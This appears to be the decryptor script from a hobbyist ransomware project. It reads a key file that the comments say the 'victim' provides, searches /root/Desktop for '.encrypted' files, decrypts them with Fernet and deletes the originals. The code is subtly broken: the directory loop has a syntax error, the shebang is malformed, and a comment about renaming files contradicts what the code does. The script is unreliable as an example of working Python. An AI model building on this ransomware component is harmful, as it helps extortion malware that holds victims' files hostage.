#! usr/bin/python 
import os
import sys

from cryptography.fernet import Fernet 

# opening file in rb mode ../

file = open(input("Please enter correct Key location") , "rb")

# reading the private key inside the file location provided by the victim /.../

key = file.read()
file.close()

#....--> 
def filelist():
	mylist = []
	# collecting all the affected files in the array declared 
	for root , dirs,files in os.walk("/root/Desktop")
		for file in files:
			if file.endswith(".encrypted"):
				mylist.append(os.path.join(root, file))

	return mylist
# this will print all the files returned in the array list mylist[]../	 
print(filelist())
# storing ... 
enc_files = filelist()

# function for decryption >>>>time to get ... 

def file_decrypt(key, files):
    
    for name in files:
        if (name!="Ransom_decrypt.py"): 
            with open(name,'rb') as f:
                data = f.read()

            fernet = Fernet(key)
            decrypted = fernet.decrypt(data)
            decrypted_file = name + ".decrypted"
            # After decryption all the files will have the .decrypted in the end
            # so , rename the file by removing this string "decrypted from the every file extension../"
            try:
                with open(decrypted_file, 'wb') as f:
                    f.write(decrypted)
                    os.remove(name)
            except:
                continue

file_decrypt(key, enc_files)
# code ends ..//.../::))///
